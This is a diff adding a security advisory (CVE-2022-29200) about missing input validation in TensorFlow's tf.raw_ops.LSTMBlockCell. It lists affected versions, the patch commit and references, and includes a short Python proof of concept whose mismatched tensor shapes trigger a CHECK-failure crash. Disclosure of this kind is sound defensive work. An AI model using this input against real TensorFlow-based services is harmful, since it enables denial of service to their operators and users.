@@ -1,0 +1,66 @@
+# [M] Missing validation causes denial of service via `LSTMBlockCell`
+
+## Summary
+Severity: Medium
+Advisory: GHSA-2vv3-56qg-g2cf
+CVE: CVE-2022-29200
+CWE: CWE-1284, CWE-20
+Ecosystem: PyPI
+CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
+Published: 2022-05-24
+Source: https://github.com/advisories/GHSA-2vv3-56qg-g2cf
+Type: github-advisory
+
+## Affected
+- PyPI: `tensorflow` — affected >=0 <2.6.4
+- PyPI: `tensorflow` — affected >=2.7.0 <2.7.2
+- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
+- PyPI: `tensorflow-cpu` — affected >=0 <2.6.4
+- PyPI: `tensorflow-cpu` — affected >=2.7.0 <2.7.2
+- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
+- PyPI: `tensorflow-gpu` — affected >=0 <2.6.4
+- PyPI: `tensorflow-gpu` — affected >=2.7.0 <2.7.2
+- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
+
+## Details
+### Impact
+The implementation of [`tf.raw_ops.LSTMBlockCell`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/rnn/lstm_ops.cc) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:
+
+```python
+import tensorflow as tf
+
+tf.raw_ops.LSTMBlockCell( 
+  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),
+  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),
+  h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),
+  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),
+  wci=tf.constant(0, shape=[], dtype=tf.float32),
+  wcf=tf.constant(0, shape=[17], dtype=tf.float32),
+  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),
+  b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),
+  forget_bias=1, cell_clip=0, use_peephole=False)
+``` 
+  
+The code does not validate the ranks of any of the arguments to this API call. This results in `CHECK`-failures when the elements of the tensor are accessed.
+    
+### Patches
+We have patched the issue in GitHub commit [803404044ae7a1efac48ba82d74111fce1ddb09a](https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a).
+    
+The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.
+
+### For more information                
+Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
+    
+### Attribution
+This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.
+
+## References
+- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf
+- https://nvd.nist.gov/vuln/detail/CVE-2022-29200
+- https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a
+- https://github.com/tensorflow/tensorflow
+- https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/rnn/lstm_ops.cc
+- https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4
+- https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2
+- https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1
+- https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0
